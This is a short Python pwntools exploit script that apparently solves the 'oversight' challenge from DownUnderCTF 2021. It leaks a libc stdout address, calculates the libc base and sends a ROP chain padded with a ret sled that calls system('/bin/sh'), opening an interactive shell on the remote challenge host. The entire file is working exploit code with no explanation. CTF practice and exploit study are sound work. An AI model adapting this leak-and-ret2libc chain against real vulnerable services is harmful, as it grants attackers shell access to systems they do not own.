from pwn import *
io = remote("pwn-2021.duc.tf",31909)
#io = process("./oversight")
libc = ELF("./libc-2.27.so")
io.sendline()

io.recvuntil("Pick a number: ")
io.sendline("17")

io.recvuntil("Your magic number is: ")
stdoutLeak = int("0x" + io.recv(12).decode(),16)
libc.address = stdoutLeak - libc.symbols["_IO_2_1_stdout_"]
popRdi = p64(libc.address + 0x215bf)
ret = p64(libc.address + 0x215c0)

binsh = p64(next(libc.search(b"/bin/sh")))
system = p64(libc.symbols["system"])

log.info("_IO_2_1_stdout_: " + hex(stdoutLeak))
log.info("Libc Base: " + hex(libc.address))

io.sendlineafter("How many bytes do you want to read (max 256)?","256")

exploit = popRdi + binsh + system + b"AAAAAAAA" #the char 'A's are for the moveaps 

retChain = ret * int((256 - len(exploit))/8)
exploit = retChain + exploit

io.sendline(exploit)
io.interactive()
